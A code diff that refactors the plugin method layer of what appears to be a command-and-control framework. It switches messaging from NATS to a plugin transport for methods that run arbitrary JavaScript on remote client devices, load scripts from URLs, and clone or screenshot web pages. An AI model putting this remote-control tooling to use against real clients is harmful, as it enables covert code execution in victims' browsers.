@@ -1,10 +1,11 @@
-import nats
-from nats.errors import TimeoutError as NatsTimeoutError
+import asyncio
 
 from hashlib import sha256
 
 from pydantic import BaseModel, Field
 from secrets import token_hex
+
+from c2.plugins.internal.transport import PluginTransport
 
 class ReconnectionError(Exception):
     pass
@@ -24,25 +25,22 @@ class ClientMessage(BaseModel):
     id:str = Field(default_factory=lambda : token_hex(16))
 
 class Methods:
-    def __init__(self, nc: nats.NATS, client_id: str):
-        self.nc = nc
-        self.js = nc.jetstream()
+    def __init__(self, transport: PluginTransport, client_id: str):
+        self.transport = transport
         self.client_id = client_id
 
-    async def _wait_for_response(self, operation_id:str, timeout:float = 10):
-        print(f'Waiting for msg on client.response.{self.client_id}.{operation_id}')
-        sub = await self.nc.subscribe(f"client.response.{self.client_id}.{operation_id}", max_msgs=1)
+    async def _wait_for_response(self, msg:ClientMessage, timeout:float = 10):
         try:
-            response_msg = await sub.next_msg(timeout=timeout)
-        except NatsTimeoutError:
+            response_data = await self.transport.send_device_command(self.client_id, msg.model_dump(mode="json"), timeout=timeout)
+        except asyncio.TimeoutError:
             raise TimeoutError("Response timed out")
-        response = ClientMessage.model_validate_json(response_msg.data.decode())
+        response = ClientMessage.model_validate(response_data)
         return response.data
-    
+
     async def serve(self, content:str | bytes, extension:str = ''):
         """
         Serves the content on the internal webserver
-        
+
         :param content: The content which should be served
         :type content: str | bytes
         :param extension: sets the file extension if not empty
@@ -66,9 +64,6 @@ class Methods:
 
         return serve_path
 
-    async def _send_client_msg(self, msg:ClientMessage):
-        await self.nc.publish(f"client.operations.{self.client_id}", msg.model_dump_json().encode())
-
     async def eval_js(self, code: str, timeout: float = 10):
         """
         Executes arbitrary code on the client and returns it's result or a error
@@ -83,76 +78,54 @@ class Methods:
 
         msg = ClientMessage(operation="eval_js", data={"code": code})
 
-        await self._send_client_msg(msg)
+        response = await self._wait_for_response(msg, timeout=timeout)
 
-        response = await self._wait_for_response(msg.id, timeout=timeout)
-        
         if response.get("err"):
             print(f"Error executing JS code: {response['err']}")
             raise JSExecutionError(response["err"])
-        
+
         return response.get("result")
 
     async def load_js(self, url: str):
         """
         Loads a javascript file from the given URL.
-        
+
         :param url: The url to load the file from
         :type url: str
         """
         msg = ClientMessage(operation="load_plugin", data={"url": url})
 
-        await self._send_client_msg(msg)
-
-        await self._wait_for_response(msg.id)
+        await self._wait_for_response(msg)
 
     async def bundle_page(self, url: str) -> str:
         """
         Generates a bundled version of the page at the given URL
-        
+
         :param self: Description
         :param url: The url of the website which should be bundled
         :type url: str
         :return: returns the bundled html as a string
         :rtype: str
         """
+        response = await self.transport.bundler_http.post("/bundle", json={"url": url}, timeout=20)
 
-        msg = ClientMessage(operation="bundle", data={"url": url})
-        raw_reponse = await self.nc.request(f"bundler.fetch", msg.model_dump_json().encode(), timeout=20)
-        response = ClientMessage.model_validate_json(raw_reponse.data)
+        if response.status_code != 200:
+            raise BundlerException(response.text)
 
-        if response.operation != 'response':
-            raise BundlerException(response.data.get('error', str(response.data)))
+        return response.text
 
-        page_name = response.data.get('result', str(response.data))
-
-        print(f"Got page with name: {page_name}")
-
-        object_store = await self.js.object_store("bundler")
-        page_data = await object_store.get(page_name)
-        
-        return page_data.data.decode()
-    
     async def preview_page(self, url: str) -> bytes:
         """
         Generates a preview of the page at the given URL
-        
+
         :param url: Description
         :type url: The url of the website
         :return: returns the screenshot as bytes
         :rtype: bytes
         """
+        response = await self.transport.bundler_http.post("/preview", json={"url": url}, timeout=20)
 
-        msg = ClientMessage(operation="preview", data={"url": url})
-        raw_reponse = await self.nc.request(f"bundler.fetch", msg.model_dump_json().encode(), timeout=20)
-        response = ClientMessage.model_validate_json(raw_reponse)
+        if response.status_code != 200:
+            raise BundlerException(response.text)
 
-        if response.operation != 'response':
-            raise BundlerException(response.data.get('error', str(response.data)))
-
-        screenshot_name = response.data.get('result', str(response.data))
-
-        object_store = await self.js.object_store("bundler")
-        screenshot_data = await object_store.get(screenshot_name)
-        
-        return screenshot_data.data
+        return response.content
